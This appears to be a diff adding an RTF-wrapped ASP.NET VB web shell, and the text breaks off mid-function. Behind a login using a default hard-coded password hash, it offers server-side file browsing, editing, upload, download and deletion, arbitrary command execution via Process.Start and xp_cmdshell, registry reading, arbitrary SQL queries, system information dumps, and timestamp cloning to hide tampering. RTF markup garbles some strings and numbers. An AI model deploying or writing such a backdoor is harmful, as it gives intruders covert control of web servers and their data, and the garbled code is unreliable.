@@ -1,0 +1,1051 @@
+{\rtf1\fbidis\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil\fcharset204 Calibri;}{\f2\fnil\fcharset178 Calibri;}{\f3\fnil\fcharset238 Calibri;}}
+{\*\generator Riched20 10.0.22621}\viewkind4\uc1 
+\pard\ltrpar\sa200\sl276\slmult1\f0\fs22\lang9 <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>\par
+<%@ import Namespace="System.IO" %>\par
+<%@ import Namespace="System.Diagnostics" %>\par
+<%@ import Namespace="Microsoft.Win32" %>\par
+<%@ import Namespace="System.Data" %>\par
+<%@ import Namespace="System.Data.OleDb" %>\par
+<script runat="server">\par
+\par
+    '---------Setting Start---------\par
+    'Here, modify the default password to yours, MD5 Hash\par
+    Const PASSWORD as string = "21232f297a57a5a743894a0e4a801fc3"\par
+    'Session name, avoid session crash\par
+    Const SESSIONNAME as string = "webadmin2"\par
+    '---------Setting End---------\par
+    \par
+    Dim SORTFILED As String\par
+    \par
+    Sub Page_load(sender As Object, E As EventArgs)\par
+      Dim error_x as Exception\par
+      Try\par
+        If Session(SESSIONNAME) = 0 Then\par
+            ShowLogin()\par
+        Else\par
+            ShowMain()\par
+            If not IsPostBack Then\par
+                Select Case Request("action")\par
+                    Case "goto"\par
+                        CDir.Text = Request("src")\par
+                        Call ShowFolders(CDir.Text)\par
+                    Case "copy"\par
+                        Call ShowCopy(Request("src"))\par
+                    Case "cut"\par
+                        Call ShowCut(Request("src"))\par
+                    Case "down"\par
+                        Call DownLoadIt(Request("src"))\par
+                    Case "edit"\par
+                        Call ShowEdit(Request("src"))\par
+                    Case "del"\par
+                        Call ShowDel(Request("src"))\par
+                    Case "rename"\par
+                        Call ShowRn(Request("src"))\par
+                    Case "att"\par
+                        Call ShowAtt(Request("src"))\par
+                End Select\par
+            End If\par
+        End If\par
+      Catch error_x\par
+            ShowError(error_x.Message)\par
+      End Try\par
+    End Sub\par
+    \par
+    Sub Login_click(sender As Object, E As EventArgs)\par
+        Dim MD5Pass As String = LCase(FormsAuthentication.HashPasswordForStoringInConfigFile(UPass.Text, "MD5"))\par
+        If MD5Pass=PASSWORD Then\par
+            Session(SESSIONNAME) = 1\par
+            Call ShowMain()\par
+        Else\par
+            Label_Info.Text = "<b>NO, no, you don't my </b>"\par
+        End If\par
+    End Sub\par
+    \par
+    Sub GoTo_click(sender As Object, E As EventArgs)\par
+        ULOGIN.Visible= False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = True\par
+        CMD.Visible = false\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+        Call ShowFolders(CDir.Text)\par
+    End Sub\par
+    \par
+    Sub ShowError(ErrorMsg As String)\par
+        Label_Info.Text = "<font color=""red""><b>Wrong: </b></font>" & ErrorMsg\par
+    End Sub\par
+    \par
+    Sub ShowMain()\par
+        Label_Info.Text = "\f1\lang1049\u1261?\f2\rtlch\lang1025\u1633?\f0\ltrch\lang1033\f3\lang1025\u496?\f2\rtlch\u1911?\f0\ltrch\lang1033  !"\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+    End Sub\par
+    \par
+    Sub ShowDrives()\par
+        Label_Drives.Text = "Go To : "\par
+        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath(".")) & """> . </a> "\par
+        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath("/")) & """> / </a> "\par
+        dim i as integer\par
+        for i =\f2\rtlch\lang1025 0 \f0\ltrch\lang1033 to Directory.GetLogicalDrives().length-\f2\rtlch\lang1025 1\f0\ltrch\lang1033\par
+             Label_Drives.Text += "<a href=""?action=goto&src=" & Directory.GetLogicalDrives(i) & """>" & Directory.GetLogicalDrives(i) & " </a>"\par
+        next\par
+    End Sub\par
+    \par
+    Sub Logout_click(sender As Object, E As EventArgs)\par
+        Session.Abandon()\par
+        Label_Info.Text = "<b>Byebye !</b>"\par
+        Call ShowLogin()\par
+    End Sub\par
+    \par
+    Sub ShowFileM(sender As Object, E As EventArgs)\par
+        ULOGIN.Visible= False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = True\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+        If CDir.Text = "" Then\par
+            CDir.Text = Server.MapPath(".")\par
+        End If\par
+        Call ShowFolders(CDir.Text)\par
+    End Sub\par
+    \par
+    Sub ShowFolders(FPath As String)\par
+      Dim error_x as Exception\par
+      Try\par
+         Call ShowDrives()\par
+        If right(FPath,\f2\rtlch\lang1025 1\f0\ltrch\lang1033 )<>"\\" Then\par
+            FPath += "\\"\par
+        End If\par
+    \par
+        dim xdir as directoryinfo\par
+           dim mydir as new DirectoryInfo(FPath)\par
+           dim xfile as fileinfo\par
+        Label_Files.Text = "<table width=""\f2\rtlch\lang1025 90\f0\ltrch\lang1033 %"" border=""\f2\rtlch\lang1025 0\f0\ltrch\lang1033 "" align=""center"">"\par
+        Label_Files.Text += "<tr><td width=""\f2\rtlch\lang1025 40\f0\ltrch\lang1033 %""><b>Name</b></td><td width=""\f2\rtlch\lang1025 15\f0\ltrch\lang1033 %""><b>Size</b></td>"\par
+        Label_Files.Text += "<td width=""\f2\rtlch\lang1025 20\f0\ltrch\lang1033 %""><b>ModifyTime</b></td><td width=""\f2\rtlch\lang1025 25\f0\ltrch\lang1033 %""><b>Operate</b></td></tr>"\par
+        Label_Files.Text += "<tr><td><tr><td><a href='?action=goto&src="\par
+        Dim tmp As String\par
+        If Len(FPath) < \f2\rtlch\lang1025 4 \f0\ltrch\lang1033 Then\par
+            tmp = server.UrlEncode(FPath)\par
+        Else\par
+            tmp = server.UrlEncode(Directory.GetParent(Left(FPath,Len(FPath)-\f2\rtlch\lang1025 1\f0\ltrch\lang1033 )).ToString())\par
+        End If\par
+        Label_Files.Text += tmp & "'><i>|Parent Directory|</i></a></td></tr>"\par
+        For each xdir in mydir.getdirectories()\par
+            Label_Files.Text += "<tr><td>"\par
+            dim filepath as string = server.UrlEncode(FPath  & xdir.name)\par
+            Label_Files.Text += "<a href='?action=goto&src=" & filepath & "\\" & "'>" & xdir.name & "</a></td>"\par
+            Label_Files.Text += "<td><dir></td>"\par
+            Label_Files.Text += "<td>" & Directory.GetLastWriteTime(FPath & "\\" & xdir.name) & "</td>"\par
+            Label_Files.Text += "<td><a href='?action=cut&src=" & filepath & "\\'  target='_blank'>Cut" & "</a>|"\par
+            Label_Files.Text += "<a href='?action=copy&src=" & filepath & "\\'  target='_blank'>Copy</a>|"\par
+            Label_Files.Text += "<a href='?action=rename&src=" & filepath & "' target='_blank'>Ren</a>|"\par
+            Label_Files.Text += "<a href='?action=att&src=" & filepath & "\\'" & "' target=_blank'>Att</a>|"\par
+            Label_Files.Text += "<a href='?action=del&src=" & filepath & "\\'" & "' target=_blank'>Del</a></td>"\par
+            Label_Files.Text += "</tr>"\par
+        Next\par
+        Label_Files.Text += "</td></tr><tr><td>"\par
+        For each xfile in mydir.getfiles()\par
+            dim filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 as string\par
+            filepath\f2\rtlch\lang1025 2\f0\ltrch\lang1033 =server.UrlEncode(FPath & xfile.name)\par
+            Label_Files.Text += "<tr><td>" & xfile.name & "</td>"\par
+            Label_Files.Text += "<td>" & GetSize(xfile.length) & "</td>"\par
+            Label_Files.Text += "<td>" & file.GetLastWriteTime(FPath  & xfile.name) & "</td>"\par
+            Label_Files.Text += "<td><a href='?action=edit&src=" & filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 & "' target='_blank'>Edit</a>|"\par
+            Label_Files.Text += "<a href='?action=cut&src=" & filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 & "' target='_blank'>Cut</a>|"\par
+            Label_Files.Text += "<a href='?action=copy&src=" & filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 & "' target='_blank'>Copy</a>|"\par
+            Label_Files.Text += "<a href='?action=rename&src=" & filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 & "' target='_blank'>Ren</a>|"\par
+            Label_Files.Text += "<a href='?action=down&src=" & filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 & "'>Down</a>|"\par
+            Label_Files.Text += "<a href='?action=att&src=" & filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 & "' target=_blank'>Att</a>|"\par
+            Label_Files.Text += "<a href='?action=del&src=" & filepath\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 & "' target=_blank'>Del</a></td>"\par
+            Label_Files.Text += "</tr>"\par
+        Next\par
+        Label_Files.Text += "</table>"\par
+       Catch error_x\par
+               ShowError(error_x.Message)\par
+       End Try\par
+    End Sub\par
+    \par
+    Function GetSize(temp)\par
+          if temp < \f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 then\par
+             GetSize=temp & " bytes"\par
+          else\par
+             if temp\\\f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 < \f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 then\par
+                GetSize=temp\\\f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 & " KB"\par
+             else\par
+                if temp\\\f2\rtlch\lang1025 1024\f0\ltrch\lang1033\\\f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 < \f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 then\par
+                       GetSize=temp\\\f2\rtlch\lang1025 1024\f0\ltrch\lang1033\\\f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 & " MB"\par
+                else\par
+                       GetSize=temp\\\f2\rtlch\lang1025 1024\f0\ltrch\lang1033\\\f2\rtlch\lang1025 1024\f0\ltrch\lang1033\\\f2\rtlch\lang1025 1024 \f0\ltrch\lang1033 & " GB"\par
+                end if\par
+             end if\par
+          end if\par
+    End Function\par
+    \par
+    Sub ShowLogin()\par
+        ULOGIN.Visible= True\par
+        MAIN.Visible = False\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+    End Sub\par
+    \par
+    'Show Cmd\par
+    Sub Button_showcmd_Click(sender As Object, E As EventArgs)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = False\par
+        CMD.Visible = True\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+    End Sub\par
+    \par
+    'Show clonetime\par
+    Sub Button_showclone_Click(sender As Object, E As EventArgs)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = True\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+    End Sub\par
+    \par
+    Sub Button_showcmdshell_Click(sender As Object, E As EventArgs)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = True\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+    End Sub\par
+    \par
+    Sub Button_showinfo_Click(sender As Object, E As EventArgs)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = True\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+        ServerIP.Text = request.ServerVariables("LOCAL_ADDR")\par
+        MachineName.Text = Environment.MachineName\par
+        UserDomainName.Text = Environment.UserDomainName.ToString()\par
+        UserName.Text = Environment.UserName\par
+        OS.Text = Environment.OSVersion.ToString()\par
+        StartTime.Text = GetStartedTime(Environment.Tickcount) & "Hours"\par
+        NowTime.Text = Now()\par
+        IISV.Text = request.ServerVariables("SERVER_SOFTWARE")\par
+        HTTPS.Text = request.ServerVariables("HTTPS")\par
+        PATHS.Text = request.ServerVariables("PATH_INFO")\par
+        PATHS\f2\rtlch\lang1025 2\f0\ltrch\lang1033 .Text = request.ServerVariables("PATH_TRANSLATED")\par
+        PORT.Text = request.ServerVariables("SERVER_PORT")\par
+        SID.Text = Session.SessionID\par
+    End Sub\par
+    \par
+    Function GetStartedTime(ms)\par
+          GetStartedTime=cint(ms/(\f2\rtlch\lang1025 1000\f0\ltrch\lang1033 *\f2\rtlch\lang1025 60\f0\ltrch\lang1033 *\f2\rtlch\lang1025 60\f0\ltrch\lang1033 ))\par
+    End function\par
+    \par
+    Sub ShowReg(Src As Object, E As EventArgs)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = True\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+    End Sub\par
+    \par
+    Sub ShowData(Src As Object, E As EventArgs)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = True\par
+        About.Visible = False\par
+    End Sub\par
+    \par
+    Sub ShowAbout(Src As Object, E As EventArgs)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = True\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = True\par
+    End Sub\par
+    \par
+    Sub ShowEdit( filepath as string)\par
+        ULOGIN.Visible = False\par
+        MAIN.Visible = false\par
+        FileManager.Visible = False\par
+        CMD.Visible = False\par
+        CloneTime.Visible = False\par
+        SQLROOTKIT.Visible = False\par
+        SysInfo.Visible = False\par
+        Reg.Visible = False\par
+        DATA.Visible = False\par
+        About.Visible = False\par
+        File_Edit.Visible = true\par
+        edited_path.Text = filepath\par
+        dim myread as new streamreader(filepath, encoding.default)\par
+           edited_path.text = filepath\par
+           edited_content.text=myread.readtoend\par
+           myread.close()\par
+    End Sub\par
+    \par
+    Sub ShowDel( filepath as string)\par
+        MAIN.Visible = false\par
+        FileManager.Visible = False\par
+        File_del.Visible = True\par
+        label_del.Text = "Are u sure delete file/Folder <b>" & filepath & "</b> ?"\par
+    End Sub\par
+    \par
+    Sub ShowRn( filepath as string)\par
+        MAIN.Visible = false\par
+        FileManager.Visible = False\par
+        File_Rename.Visible = True\par
+        btn_rename.Text = path.getfilename(filepath)\par
+    End Sub\par
+    \par
+    Sub RunCMD(Src As Object, E As EventArgs)\par
+        Dim error_x as Exception\par
+          Try\par
+        Dim myProcess As New Process()\par
+        Dim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)\par
+        myProcessStartInfo.UseShellExecute = False\par
+        myProcessStartInfo.RedirectStandardOutput = true\par
+        myProcess.StartInfo = myProcessStartInfo\par
+        myProcessStartInfo.Arguments = CMDCommand.text\par
+        myProcess.Start()\par
+        Dim myStreamReader As StreamReader = myProcess.StandardOutput\par
+        Dim myString As String = myStreamReader.Readtoend()\par
+        myProcess.Close()\par
+        mystring=replace(mystring,"<","<")\par
+        mystring=replace(mystring,">",">")\par
+        CMDresult.text = "<pre>" & mystring & "</pre>"\par
+          Catch error_x\par
+               ShowError(error_x.Message)\par
+          End Try\par
+    End Sub\par
+    \par
+    Sub GoCloneTime(Src As Object, E As EventArgs)\par
+          Dim error_x as Exception\par
+          Try\par
+          Dim thisfile As FileInfo =New FileInfo(time\f2\rtlch\lang1025 1\f0\ltrch\lang1033 .Text)\par
+          Dim thatfile As FileInfo =New FileInfo(time\f2\rtlch\lang1025 2\f0\ltrch\lang1033 .Text)\par
+          thisfile.LastWriteTime = thatfile.LastWriteTime\par
+          thisfile.LastAccessTime = thatfile.LastAccessTime\par
+          thisfile.CreationTime = thatfile.CreationTime\par
+          Label_cloneResult.Text = "<font color=""red"">Clone Time Success!</font>"\par
+          Catch error_x\par
+               ShowError(error_x.Message)\par
+          End Try\par
+    End Sub\par
+    \par
+    Sub CMDSHELL(Src As Object, E As EventArgs)\par
+            Dim error_x as Exception\par
+          Try\par
+            Dim adoConn,strQuery,recResult,strResult\par
+                 adoConn=Server.CreateObject("ADODB.Connection")\par
+                 adoConn.Open(ConStr.Text)\par
+                 If Sqlcmd.Text<>"" Then\par
+                    strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'"\par
+                        recResult = adoConn.Execute(strQuery)\par
+                     If NOT recResult.EOF Then\par
+                        Do While NOT recResult.EOF\par
+                            strResult = strResult & chr(\f2\rtlch\lang1025 13\f0\ltrch\lang1033 ) & recResult(\f2\rtlch\lang1025 0\f0\ltrch\lang1033 ).value\par
+                            recResult.MoveNext\par
+                        Loop\par
+                     End if\par
+                     recResult = Nothing\par
+                     strResult = Replace(strResult," ","&nbsp;")\par
+                     strResult = Replace(strResult,"<","<")\par
+                     strResult = Replace(strResult,">",">")\par
+                    resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"\par
+                 End if\par
+                  adoConn.Close\par
+           Catch error_x\par
+               ShowError(error_x.Message)\par
+          End Try\par
+    End Sub\par
+    \par
+    Sub ReadReg(Src As Object, E As EventArgs)\par
+              Dim error_x as Exception\par
+        Try\par
+              Dim hu As String = RegKey.Text\par
+              Dim rk As RegistryKey\par
+              Select Mid( hu ,\f2\rtlch\lang1025 1 \f0\ltrch\lang1033 , Instr( hu,"\\" )-\f2\rtlch\lang1025 1 \f0\ltrch\lang1033 )\par
+                 case "HKEY_LOCAL_MACHINE"\par
+                    rk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\\" )) , \f2\rtlch\lang1025 0 \f0\ltrch\lang1033 )\par
+                 case "HKEY_CLASSES_ROOT"\par
+                    rk = Registry.ClassesRoot.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\\" )) , \f2\rtlch\lang1025 0 \f0\ltrch\lang1033 )\par
+                 case "HKEY_CURRENT_USER"\par
+                    rk = Registry.CurrentUser.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\\" )) , \f2\rtlch\lang1025 0 \f0\ltrch\lang1033 )\par
+                 case "HKEY_USERS"\par
+                    rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\\" )) , \f2\rtlch\lang1025 0 \f0\ltrch\lang1033 )\par
+                 case "HKEY_CURRENT_CONFIG"\par
+                    rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\\" )) , \f2\rtlch\lang1025 0 \f0\ltrch\lang1033 )\par
+              End Select\par
+              RegResult.Text = rk.GetValue(RegValue.Text , "NULL")\par
+              rk.Close()\par
+        Catch error_x\par
+              ShowError(error_x.Message)\par
+        End Try\par
+    End Sub\par
+    \par
+    Sub DB_onrB_\f2\rtlch\lang1025 1\f0\ltrch\lang1033 (sender As Object, E As EventArgs)\par
+          DataCStr.Text = "server=\f2\rtlch\lang1025 127.0.0.1\f0\ltrch\lang1033 ;UID=sa;PWD=;database=news;Provider=SQLOLEDB"\par
+          Type_Acc.Checked = false\par
+          Type_SQL.Checked = true\par
+    End Sub\par
+    \par
+    Sub DB_onrB_\f2\rtlch\lang1025 2\f0\ltrch\lang1033 (sender As Object, E As EventArgs)\par
+          Type_Acc.Checked = true\par
+          Type_SQL.Checked = false\par
+          DataCStr.Text = "Provider=Microsoft.Jet.OLEDB.\f2\rtlch\lang1025 4.0\f0\ltrch\lang1033 ;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb"\par
+    End Sub\par
+    \par
+    Sub DB_Submit_Click(sender As Object, E As EventArgs)\par
+          Dim error_x as Exception\par
+          Try\par
+          DB_eButton.Visible = True\par
+          DB_eString.Visible = True\par
+          DB_exe.Visible = True\par
+          db_showTable.Text = "<br><b>The Tables :</b><br>"\par
+          Dim i As Integer\par
+          Dim db_conn As New OleDbConnection(DataCStr.Text)\par
+          Dim db_schemaTable As DataTable\par
+          db_conn.open()\par
+          db_schemaTable = db_conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, New Object() \{Nothing, Nothing, Nothing, "TABLE"\})\par
+          For i = \f2\rtlch\lang1025 0 \f0\ltrch\lang1033 To db_schemaTable.Rows.Count - \f2\rtlch\lang1025 1\f0\ltrch\lang1033\par
+            db_showTable.Text += db_schemaTable.Rows(i)!TABLE_NAME.ToString & "<br>"\par
+          Next i\par
+          db_conn.close()\par
+          Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+    End Sub\par
+    \par
+    Sub DB_Page(sender As Object, e As System.Web.UI.WebControls.DataGridPageChangedEventArgs)\par
+          DB_DataGrid.CurrentPageIndex = e.NewPageIndex\par
+          Call BindData()\par
+    End Sub\par
+    \par
+    Sub DB_Sort(sender As Object, E As DataGridSortCommandEventArgs)\par
+          SORTFILED = E.SortExpression\par
+          Call BindData()\par
+    End Sub\par
+    \par
+    Sub DB_Exec_Click(sender As Object, E As EventArgs)\par
+           DB_ExecRes.Text = ""\par
+           If LCase(Left(DB_EString.Text, \f2\rtlch\lang1025 6\f0\ltrch\lang1033 )) = "select" Then\par
+                Call BindData()\par
+           Else\par
+                Call DB_Exec()\par
+           End If\par
+    End Sub\par
+    \par
+    Sub DB_Exec()\par
+          Dim error_x as Exception\par
+          Try\par
+              Dim db_conn As New OleDbConnection(DataCStr.Text)\par
+              Dim db_cmd As New OleDbCommand( DB_EString.Text , db_conn )\par
+              db_conn.Open()\par
+              db_cmd.ExecuteNonQuery()\par
+              db_conn.Close()\par
+              DB_ExecRes.Text = "<b>Done! </b>"\par
+          Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+    End Sub\par
+    \par
+    Function myGetTableName(SQLS As String)\par
+        Dim TEMP, TEMP\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 As String\par
+        TEMP = Right(SQLs, Len(SQLS) - Instr(\f2\rtlch\lang1025 1\f0\ltrch\lang1033 , SQLs, "from", \f2\rtlch\lang1025 1\f0\ltrch\lang1033 ) - \f2\rtlch\lang1025 3 \f0\ltrch\lang1033 )\par
+        Dim i As Integer\par
+        For i = \f2\rtlch\lang1025 1 \f0\ltrch\lang1033 to Len(TEMP)\par
+            If Mid(TEMP, i, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 ) <> vbcrlf Then\par
+                TEMP\f2\rtlch\lang1025 2 \f0\ltrch\lang1033 += Mid(TEMP, i, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 )\par
+            Else\par
+                Exit For\par
+            End If\par
+        Next\par
+        myGetTableName = TEMP\f2\rtlch\lang1025 2\f0\ltrch\lang1033\par
+    End Function\par
+    \par
+    Sub BindData()\par
+          Dim error_x as Exception\par
+          Try\par
+          Dim myTableName As String = myGetTableName(DB_EString.Text)\par
+          Dim db_conn As New OleDbConnection(DataCStr.Text)\par
+          Dim db_cmd As New OleDbCommand( DB_EString.Text , db_conn )\par
+          Dim db_adp As New OleDbDataAdapter(db_cmd)\par
+          Dim db_ds As New DataSet()\par
+          db_adp.Fill(db_ds,myTableName)\par
+          DB_DataGrid.DataSource = db_ds.Tables(myTableName).DefaultView\par
+          db_ds.Tables(myTableName).DefaultView.Sort = SORTFILED\par
+          DB_DataGrid.DataBind()\par
+          Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+    End Sub\par
+    \par
+       Sub DownLoadIt(thePath)\par
+         Dim error_x as Exception\par
+          Try\par
+           dim stream\par
+           stream=server.createObject("adodb.stream")\par
+           stream.open\par
+           stream.type=\f2\rtlch\lang1025 1\f0\ltrch\lang1033\par
+           stream.loadFromFile(thePath)\par
+           response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))\par
+           response.addHeader("Content-Length",stream.Size)\par
+           response.charset="UTF-\f2\rtlch\lang1025 8\f0\ltrch\lang1033 "\par
+           response.contentType="application/octet-stream"\par
+           response.binaryWrite(stream.read)\par
+           response.flush\par
+           stream.close\par
+           stream=nothing\par
+           response.End()\par
+         Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+       End Sub\par
+    \par
+        sub FileEdit(Src As Object, E As EventArgs)\par
+            Dim error_x as Exception\par
+            Try\par
+              dim mywrite as new streamwriter(edited_path.text, false, encoding.default)\par
+              mywrite.write(edited_content.text)\par
+              mywrite.close\par
+              response.Write("<script>alert('Edit|Creat " & replace(edited_path.text,"\\","\\\\") & " Success! Please refresh')</sc"&"ript>")\par
+            Catch error_x\par
+              ShowError(error_x.Message)\par
+            End Try\par
+        end sub\par
+    \par
+        sub FileDel(Src As Object, E As EventArgs)\par
+            Call del( Request("src") )\par
+        end sub\par
+    \par
+        Sub del(a as string)\par
+              if right(a,\f2\rtlch\lang1025 1\f0\ltrch\lang1033 )="\\" then\par
+                 dim xdir as directoryinfo\par
+                 dim mydir as new DirectoryInfo(a)\par
+                 dim xfile as fileinfo\par
+                 for each xfile in mydir.getfiles()\par
+                    file.delete(a & xfile.name)\par
+                 next\par
+                 for each xdir in mydir.getdirectories()\par
+                    call del(a & xdir.name & "\\")\par
+                 next\par
+                 directory.delete(a)\par
+              else\par
+                 file.delete(a)\par
+              end if\par
+              response.Write("<script>alert('Delete " & replace(a,"\\","\\\\") & " Success! Please refresh')</sc"&"ript>")\par
+              response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")\par
+        End Sub\par
+    \par
+    Sub rn_rn_Click(Src As Object, E As EventArgs)\par
+       Dim error_x as Exception\par
+          Try\par
+        Rename( request("src"), Directory.GetParent(request("src")).ToString() & "\\" & btn_rename.Text )\par
+        response.Write("<script>alert('Rename Success! Please refresh')</sc"&"ript>")\par
+        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")\par
+        Catch error_x\par
+            ShowError(error_x.Message)\par
+        End Try\par
+    End Sub\par
+    \par
+    Sub NewFile(Src As Object, E As EventArgs)\par
+       Dim error_x as Exception\par
+        Try\par
+        Dim temp As String\par
+        If right(CDir.Text, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 ) <> "\\" Then\par
+            temp = CDir.Text & "\\"\par
+        Else\par
+            temp = CDir.Text\par
+        End If\par
+        dim mywrite as new streamwriter(temp & TextBox_FDName.Text, true, encoding.default)\par
+        mywrite.close\par
+        label_info.Text = "Create File Success !"\par
+        Call ShowFolders(CDir.Text)\par
+        TextBox_FDName.Text = ""\par
+         Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+    End Sub\par
+    \par
+    Sub NewFolder(Src As Object, E As EventArgs)\par
+          Dim error_x as Exception\par
+          Try\par
+        Dim temp As String\par
+        If right(CDir.Text, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 ) <> "\\" Then\par
+            temp = CDir.Text & "\\"\par
+        Else\par
+            temp = CDir.Text\par
+        End If\par
+        directory.createdirectory(temp & TextBox_FDName.Text)\par
+        label_info.Text = "Create Folder Success !"\par
+        Call ShowFolders(CDir.Text)\par
+        TextBox_FDName.Text = ""\par
+          Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+    End Sub\par
+    \par
+    Sub UpLoad(Src As Object, E As EventArgs)\par
+          Dim error_x as Exception\par
+          Try\par
+        Dim temp As String\par
+        If right(CDir.Text, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 ) <> "\\" Then\par
+            temp = CDir.Text & "\\"\par
+        Else\par
+            temp = CDir.Text\par
+        End If\par
+          dim filename,loadpath as string\par
+          filename = path.getfilename(UpFile.value)\par
+          loadpath = temp & filename\par
+          UpFile.postedfile.saveas(loadpath)\par
+          label_info.Text = "Upload File Success !"\par
+          Call ShowFolders(CDir.Text)\par
+          Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+    End Sub\par
+    \par
+    Sub ShowAtt(path As String)\par
+        MAIN.Visible = false\par
+        FileManager.Visible = False\par
+        File_Att.Visible = True\par
+        If (File.GetAttributes(path) And FileAttributes.Hidden) = FileAttributes.Hidden Then\par
+            Hide.Checked = True\par
+        End If\par
+        If (File.GetAttributes(path) And FileAttributes.ReadOnly) = FileAttributes.ReadOnly Then\par
+            onlyread.Checked = True\par
+        End If\par
+        If (File.GetAttributes(path) And FileAttributes.System) = FileAttributes.System Then\par
+            sys.Checked = True\par
+        End If\par
+        If (File.GetAttributes(path) And FileAttributes.Archive) = FileAttributes.Archive Then\par
+            Archive.Checked = True\par
+        End If\par
+    End Sub\par
+    \par
+        Sub SetAttributes( path As String)\par
+            If onlyread.Checked = True Then\par
+                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.ReadOnly)\par
+            Else\par
+                If (File.GetAttributes(path) And FileAttributes.ReadOnly) = FileAttributes.ReadOnly Then\par
+                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.ReadOnly)\par
+                End If\par
+            End If\par
